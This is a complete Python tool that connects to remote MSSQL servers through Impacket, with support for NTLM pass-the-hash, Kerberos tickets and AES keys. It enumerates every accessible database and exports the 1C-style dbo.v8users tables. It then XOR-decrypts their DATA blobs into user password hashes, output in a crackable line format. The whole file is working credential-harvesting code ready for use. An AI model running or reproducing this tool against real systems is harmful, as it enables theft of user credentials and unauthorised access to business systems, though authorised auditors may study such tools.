#!/usr/bin/env python3
"""Export dbo.v8users from MSSQL and XOR-decrypt DATA in one standalone file."""

from __future__ import annotations

import argparse
import base64
import binascii
import gc
import logging
import re
import sys
import traceback
from collections.abc import Callable, Iterator, Sequence
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Protocol

SYSTEM_DATABASES = frozenset({"master", "model", "msdb", "tempdb"})
REPORT_SERVER_PREFIX = "ReportServer"
DEFAULT_PORT = 1433
DEFAULT_TIMEOUT = 30
DEFAULT_PAGE_SIZE = 0
DATE_FMT = "%Y%m%d%H%M%S"
HEX_FIELD_RE = re.compile(r"^0[xX]([0-9A-Fa-f]+)$")
HASH_PAIR_RE = re.compile(r'\d+,\d+,"(\S+)","(\S+)",\d+,\d+')
DATE_RE = re.compile(r"\d{14}")
HEX_BYTES_RE = re.compile(rb"^(?:0x)?[0-9A-Fa-f]+$")
TARGET_RE = re.compile(r"(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)")
# SQL Server 2008/R2 and old compatibility levels reject OFFSET/FETCH.
# The Russian engine says "параметра NEXT в инструкции FETCH", not "FETCH NEXT".
OFFSET_UNSUPPORTED_RE = re.compile(
    r"OFFSET|\bFETCH\b|\bNEXT\b|синтаксис|syntax|недопустим",
    re.IGNORECASE,
)


def extract_valid_date(text: str) -> str:
    for match in DATE_RE.findall(text):
        try:
            datetime.strptime(match, DATE_FMT)
        except ValueError:
            continue
        return match
    return ""


def extract_values_234(text: str) -> tuple[str, str, str]:
    parts = text.split(",")
    values: list[str] = []
    for index in range(1, 4):
        if index < len(parts):
            values.append(parts[index].strip('" '))
        else:
            values.append("")
    return values[0], values[1], values[2]


def extract_hashes(text: str) -> tuple[str, str] | None:
    result = HASH_PAIR_RE.search(text)
    if result is None:
        return None
    hashes: list[str] = []
    for value in result.groups():
        try:
            decoded = base64.decodebytes(value.encode("ascii"))
        except (ValueError, binascii.Error):
            return None
        hashes.append(decoded.hex())
    return hashes[0], hashes[1]


def hex_to_bytes(hex_string: str) -> bytes:
    hex_string = hex_string.strip()
    if hex_string.lower().startswith("0x"):
        hex_string = hex_string[2:]
    if len(hex_string) % 2 != 0:
        hex_string = "0" + hex_string
    return bytes.fromhex(hex_string)


def decrypt_block(block: bytes) -> str | None:
    if not block:
        return None
    key_len = block[0]
    if key_len >= len(block) - 1:
        return None
    decoded = bytearray()
    key_index = 1
    for i in range(key_len + 1, len(block)):
        if key_index > key_len:
            key_index = 1
        decoded.append(block[i] ^ block[key_index])
        key_index += 1
    try:
        return decoded.decode("utf-8")
    except UnicodeDecodeError:
        return None


def build_replacement(decoded_text: str) -> str | None:
    hashes = extract_hashes(decoded_text)
    if not hashes:
        return None
    name, desc, osname = extract_values_234(decoded_text)
    date = extract_valid_date(decoded_text)
    return f"{name}:{desc}:{osname}:{date}:{hashes[0]}:{hashes[1]}"


def process_hex_field(field: str) -> str | None:
    match = HEX_FIELD_RE.fullmatch(field.strip())
    if not match:
        return None
    try:
        block = hex_to_bytes(match.group(1))
    except ValueError:
        return None
    decoded_text = decrypt_block(block)
    if decoded_text is None:
        return None
    return build_replacement(decoded_text)


def process_line(line: str) -> str | None:
    line = line.rstrip("\r\n")
    if not line:
        return None
    parts = line.split(";")
    for i, part in enumerate(parts):
        replacement = process_hex_field(part)
        if replacement is not None:
            parts[i] = replacement
            return ";".join(parts)
    return None


class QueryClient(Protocol):
    def query(self, sql: str) -> list[dict[str, object]]: ...


@dataclass(frozen=True)
class ConnectOptions:
    host: str
    port: int = DEFAULT_PORT
    username: str = ""
    password: str = ""
    domain: str = ""
    windows_auth: bool = False
    hashes: str | None = None
    kerberos: bool = False
    aes_key: str = ""
    dc_ip: str | None = None
    target_ip: str | None = None
    timeout: int = DEFAULT_TIMEOUT


def parse_target(target: str) -> tuple[str, str, str, str]:
    match = TARGET_RE.fullmatch(target)
    if match is None:
        raise ValueError(f"Invalid target: {target}")
    domain, username, password, remote_name = match.groups("")
    if "@" in remote_name:
        extra, _, host = remote_name.rpartition("@")
        password = f"{password}@{extra}" if password else extra
        remote_name = host
    return domain, username, password, remote_name


def normalize_hashes(value: str | None) -> str | None:
    if not value:
        return None
    return value if ":" in value else f":{value}"


def authenticate(mssql: object, options: ConnectOptions) -> bool:
    if options.kerberos or options.aes_key:
        return bool(
            mssql.kerberosLogin(  # type: ignore[attr-defined]
                "master",
                options.username,
                options.password,
                options.domain,
                options.hashes,
                options.aes_key or "",
                kdcHost=options.dc_ip,
            )
        )
    return bool(
        mssql.login(  # type: ignore[attr-defined]
            "master",
            options.username,
            options.password,
            options.domain,
            options.hashes,
            options.windows_auth,
        )
    )


class ImpacketClient:
    def __init__(self, options: ConnectOptions, verbose: bool = False):
        self.verbose = verbose
        try:
            from impacket.tds import MSSQL
        except ImportError as exc:
            raise SystemExit("Impacket is required: pip install impacket") from exc

        logging.getLogger("impacket").setLevel(logging.ERROR)
        connect_host = options.target_ip or options.host
        if verbose:
            account = f"{options.domain}\\{options.username}" if options.domain else options.username
            method = "kerberos" if options.kerberos or options.aes_key else (
                "windows-auth" if options.windows_auth else "sql-login"
            )
            print(
                f"connecting to {connect_host}:{options.port} as {account} ({method})",
                file=sys.stderr,
            )
        self._mssql = MSSQL(
            connect_host,
            options.port,
            remoteName=options.host,
            application_name="v8users-export",
        )
        self._mssql.connect(timeout=options.timeout)
        try:
            logged_in = authenticate(self._mssql, options)
        except Exception:
            self.close()
            raise
        if not logged_in:
            self.close()
            raise ConnectionError("Login rejected. Check the credentials.")
        if verbose:
            print("login succeeded", file=sys.stderr)

    def query(self, sql: str) -> list[dict[str, object]]:
        if self.verbose:
            preview = " ".join(sql.split())
            if len(preview) > 240:
                preview = preview[:240] + "..."
            print(f"SQL: {preview}", file=sys.stderr)
        try:
            rows = self._mssql.sql_query(sql)
            error = getattr(self._mssql, "lastError", False)
            if error:
                raise RuntimeError(str(error))
            result = list(rows or [])
            if self.verbose:
                print(f"SQL returned {len(result)} row(s)", file=sys.stderr)
            return result
        finally:
            self._mssql.rows = []
            self._mssql.colMeta = []
            self._mssql.replies = {}

    def close(self) -> None:
        try:
            self._mssql.disconnect()
        except Exception:
            return


def quotename(name: str) -> str:
    if not name or "\x00" in name:
        raise ValueError("Empty identifier")
    return "[" + name.replace("]", "]]") + "]"


def row_value(row: dict[str, object], *names: str) -> object:
    lookup = {str(key).lower(): value for key, value in row.items()}
    for name in names:
        if name.lower() in lookup:
            return lookup[name.lower()]
    return None


def cell(value: object, default: str = "") -> str:
    if value is None:
        return default
    if isinstance(value, bool):
        return "1" if value else "0"
    return str(value)


def format_osname(value: object) -> str:
    text = cell(value).strip()
    if not text or text.upper() in {"NULL", "NONE"}:
        return "NULL"
    return text


def format_changed(value: object) -> str:
    if value is None:
        return ""
    if isinstance(value, datetime):
        return value.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    return str(value)


def format_data(value: object) -> str:
    if value is None or value == "":
        return ""
    if isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
        if HEX_BYTES_RE.fullmatch(raw):
            text = raw.decode("ascii")
            return text if text.lower().startswith("0x") else "0x" + text
        return "0x" + raw.hex()
    text = str(value).strip()
    if not text:
        return ""
    if text.lower().startswith("0x"):
        return "0x" + text[2:]
    return "0x" + text


def login_enabled_flag(eauth: object, osname: object) -> str:
    if eauth not in (None, ""):
        text = str(eauth).strip().lower()
        if text in {"1", "true", "yes", "да"}:
            return "1"
        if text.lstrip("-").isdigit() and int(text) != 0:
            return "1"
    os_text = cell(osname).strip()
    if os_text and os_text.upper() not in {"NULL", "NONE"}:
        return "1"
    return "0"


def format_dump_line(database: str, row: dict[str, object]) -> str:
    osname_raw = row_value(row, "OSName")
    eauth = cell(row_value(row, "EAuth"), "0")
    return ";".join(
        [
            database,
            cell(row_value(row, "Name")),
            cell(row_value(row, "Descr")),
            format_osname(osname_raw),
            format_changed(row_value(row, "Changed")),
            cell(row_value(row, "RolesID")),
            cell(row_value(row, "Show")),
            format_data(row_value(row, "Data")),
            eauth,
            cell(row_value(row, "AdmRole"), "0"),
            cell(row_value(row, "UsSprH")),
            login_enabled_flag(eauth, osname_raw),
        ]
    )


def is_skipped_database(name: str) -> bool:
    return name in SYSTEM_DATABASES or name.startswith(REPORT_SERVER_PREFIX)


def list_databases(client: QueryClient, only: Sequence[str] | None = None) -> list[str]:
    rows = client.query(
        """
        SELECT name
        FROM sys.databases
        WHERE state = 0
          AND HAS_DBACCESS(name) = 1
        ORDER BY name
        """
    )
    names = [cell(row_value(row, "name")) for row in rows]
    names = [name for name in names if name and not is_skipped_database(name)]
    if only:
        wanted = {item.lower() for item in only}
        names = [name for name in names if name.lower() in wanted]
    return names


def database_has_v8users(client: QueryClient, database: str) -> bool:
    quoted = quotename(database)
    rows = client.query(
        f"""
        SELECT 1 AS ok
        FROM {quoted}.sys.tables AS t
        INNER JOIN {quoted}.sys.schemas AS s ON s.schema_id = t.schema_id
        WHERE t.name = N'v8users' AND s.name = N'dbo' AND t.type = N'U'
        """
    )
    return bool(rows)


def v8users_select_sql(database: str, offset: int | None = None, page_size: int = DEFAULT_PAGE_SIZE) -> str:
    quoted = quotename(database)
    sql = f"""
        SELECT
            u.[Name] AS [Name],
            u.[Descr] AS [Descr],
            u.[OSName] AS [OSName],
            CONVERT(VARCHAR(23), u.[Changed], 121) AS [Changed],
            CONVERT(NVARCHAR(4000), u.[RolesID]) AS [RolesID],
            CONVERT(INT, u.[Show]) AS [Show],
            CONVERT(VARBINARY(MAX), u.[Data]) AS [Data],
            CONVERT(INT, u.[EAuth]) AS [EAuth],
            CONVERT(INT, u.[AdmRole]) AS [AdmRole],
            CONVERT(NVARCHAR(255), u.[UsSprH]) AS [UsSprH]
        FROM {quoted}.[dbo].[v8users] AS u
        """
    if offset is None:
        return sql
    return sql + f" ORDER BY u.[Name] OFFSET {int(offset)} ROWS FETCH NEXT {int(page_size)} ROWS ONLY"


def iter_v8users(
    client: QueryClient,
    database: str,
    page_size: int = DEFAULT_PAGE_SIZE,
    verbose: bool = False,
    page_mode: list[str] | None = None,
) -> Iterator[dict[str, object]]:
    if page_mode is None:
        page_mode = ["offset" if page_size > 0 else "full"]
    offset = 0
    while True:
        paged = page_mode[0] != "full" and page_size > 0
        if verbose:
            mode = f"offset={offset} page_size={page_size}" if paged else "full SELECT"
            print(f"fetching {database} ({mode})", file=sys.stderr)
        sql = v8users_select_sql(database, offset if paged else None, page_size or 50)
        try:
            rows = client.query(sql)
        except Exception as exc:
            if paged and offset == 0 and OFFSET_UNSUPPORTED_RE.search(str(exc)):
                page_mode[0] = "full"
                if verbose:
                    print(
                        f"{database}: OFFSET/FETCH unsupported, using a full SELECT",
                        file=sys.stderr,
                    )
                continue
            raise
        if not rows:
            break
        for row in rows:
            yield row
        count = len(rows)
        rows.clear()
        if not paged or count < page_size:
            break
        offset += page_size


def export_from_client(
    client: QueryClient,
    only: Sequence[str] | None = None,
    page_size: int = DEFAULT_PAGE_SIZE,
    on_line: Callable[[str], None] | None = None,
    verbose: bool = False,
) -> tuple[list[str], list[str]]:
    lines: list[str] = []
    processed: list[str] = []
    databases = list_databases(client, only)
    page_mode = ["offset" if page_size > 0 else "full"]
    if verbose:
        print(f"databases to scan: {len(databases)}", file=sys.stderr)
    for database in databases:
        try:
            if not database_has_v8users(client, database):
                print(f"Skipping {database}: no dbo.v8users", file=sys.stderr)
                continue
            count = 0
            for row in iter_v8users(
                client, database, page_size, verbose=verbose, page_mode=page_mode
            ):
                line = format_dump_line(database, row)
                if on_line is not None:
                    on_line(line)
                else:
                    lines.append(line)
                count += 1
            processed.append(database)
            print(f"Processed database: {database} ({count})", file=sys.stderr)
            gc.collect()
        except Exception as exc:
            print(f"Error in database {database}: {exc}", file=sys.stderr)
            if verbose:
                traceback.print_exc()
    return lines, processed


def split_username(username: str, domain: str) -> tuple[str, str]:
    if "\\" in username:
        parsed_domain, parsed_user = username.split("\\", 1)
        return domain or parsed_domain, parsed_user
    if "/" in username and not domain:
        parsed_domain, parsed_user = username.split("/", 1)
        return parsed_domain, parsed_user
    return domain, username


def require_auth_secret(options: ConnectOptions, no_pass: bool) -> None:
    if not options.username:
        raise SystemExit("Empty username. Pass [[domain/]username[:password]@]host.")
    if options.password or options.hashes or options.aes_key or no_pass:
        return
    raise SystemExit(
        "Pass the password as an argument: user:password@host. "
        "Or use -hashes, -aesKey, or -no-pass with -k."
    )


def open_line_writer(output: Path | None) -> tuple[Callable[[str], None], Callable[[int], None]]:
    count = {"n": 0}
    if output is None:
        def write(line: str) -> None:
            sys.stdout.write(line + "\n")
            count["n"] += 1

        def finish(_processed: int) -> None:
            sys.stdout.flush()

        return write, finish

    handle = output.open("w", encoding="utf-8", buffering=1)

    def write(line: str) -> None:
        handle.write(line + "\n")
        count["n"] += 1

    def finish(_processed: int) -> None:
        handle.close()
        print(f"Wrote lines: {count['n']}", file=sys.stderr)
        print(f"Output: {output}", file=sys.stderr)

    return write, finish


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Export all v8users tables from a remote MSSQL server and decrypt "
            "the DATA field (0x...) in one pass. The password is passed as an "
            "argument. Authentication matches Impacket mssqlclient."
        )
    )
    parser.add_argument(
        "target",
        nargs="?",
        help="[[domain/]username[:password]@]host, same format as Impacket",
    )
    parser.add_argument("--host", help="SQL Server host if target is omitted")
    parser.add_argument(
        "-port",
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"TDS port, default {DEFAULT_PORT}",
    )
    parser.add_argument("--domain", default="", help="Domain if it is not in target")
    parser.add_argument(
        "-windows-auth",
        "--windows-auth",
        action="store_true",
        help="Windows Authentication (NTLM), not a SQL login",
    )
    auth = parser.add_argument_group("authentication")
    auth.add_argument(
        "-hashes",
        "--hashes",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format LMHASH:NTHASH. :NTHASH is accepted",
    )
    auth.add_argument(
        "-no-pass",
        "--no-pass",
        action="store_true",
        help="Do not require a password (for -k and a KRB5CCNAME ticket)",
    )
    auth.add_argument(
        "-k",
        "--kerberos",
        action="store_true",
        help="Kerberos. Uses KRB5CCNAME or credentials from the command line",
    )
    auth.add_argument(
        "-aesKey",
        "--aes-key",
        dest="aes_key",
        metavar="HEX",
        help="Kerberos AES key, 128 or 256 bits",
    )
    conn = parser.add_argument_group("connection")
    conn.add_argument(
        "-dc-ip",
        "--dc-ip",
        dest="dc_ip",
        metavar="IP",
        help="Domain controller for Kerberos. Defaults to the domain in target",
    )
    conn.add_argument(
        "-target-ip",
        "--target-ip",
        dest="target_ip",
        metavar="IP",
        help="Server IP when target is a NetBIOS name",
    )
    parser.add_argument(
        "--database",
        dest="databases",
        action="append",
        default=[],
        help="Limit to this database. Repeatable",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        help="Output file. Defaults to stdout",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Connect timeout in seconds, default {DEFAULT_TIMEOUT}",
    )
    parser.add_argument(
        "--page-size",
        type=int,
        default=DEFAULT_PAGE_SIZE,
        help=(
            "Users per OFFSET/FETCH page. Default 0 = one SELECT per database "
            "(works on SQL Server 2008). Use 50+ only on SQL Server 2012+"
        ),
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Print extra diagnostic information",
    )
    return parser


def settings_from_args(args: argparse.Namespace) -> ConnectOptions:
    domain = args.domain or ""
    username = ""
    password = ""
    host = args.host or ""
    if args.target:
        parsed_domain, parsed_user, parsed_password, parsed_host = parse_target(args.target)
        domain = domain or parsed_domain
        username = parsed_user
        password = parsed_password
        host = host or parsed_host
        domain, username = split_username(username, domain)
    if not host:
        raise SystemExit("Pass a target or --host.")
    options = ConnectOptions(
        host=host,
        port=args.port,
        username=username,
        password=password,
        domain=domain or "",
        windows_auth=args.windows_auth,
        hashes=normalize_hashes(args.hashes),
        kerberos=bool(args.kerberos or args.aes_key),
        aes_key=args.aes_key or "",
        dc_ip=args.dc_ip,
        target_ip=args.target_ip,
        timeout=args.timeout,
    )
    require_auth_secret(options, args.no_pass)
    return options


def run_export_decrypt(
    options: ConnectOptions,
    databases: Sequence[str],
    output: Path | None,
    page_size: int = DEFAULT_PAGE_SIZE,
    verbose: bool = False,
) -> int:
    write, finish = open_line_writer(output)
    dropped = {"n": 0}

    def on_line(line: str) -> None:
        decrypted = process_line(line)
        if decrypted is None:
            dropped["n"] += 1
            if verbose:
                preview = line[:120].replace("\n", " ")
                print(f"dropped undecryptable line: {preview}", file=sys.stderr)
            return
        write(decrypted)

    processed: list[str] = []
    try:
        client = ImpacketClient(options, verbose=verbose)
        try:
            _lines, processed = export_from_client(
                client,
                databases or None,
                page_size=page_size,
                on_line=on_line,
                verbose=verbose,
            )
        finally:
            client.close()
    finally:
        finish(len(processed))
    if verbose:
        print(f"dropped undecryptable lines: {dropped['n']}", file=sys.stderr)
    if not processed:
        print("No databases with dbo.v8users were found.", file=sys.stderr)
        return 1
    return 0


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        options = settings_from_args(args)
        return run_export_decrypt(
            options,
            args.databases,
            args.output,
            page_size=args.page_size,
            verbose=args.verbose,
        )
    except SystemExit:
        raise
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        if args.verbose:
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
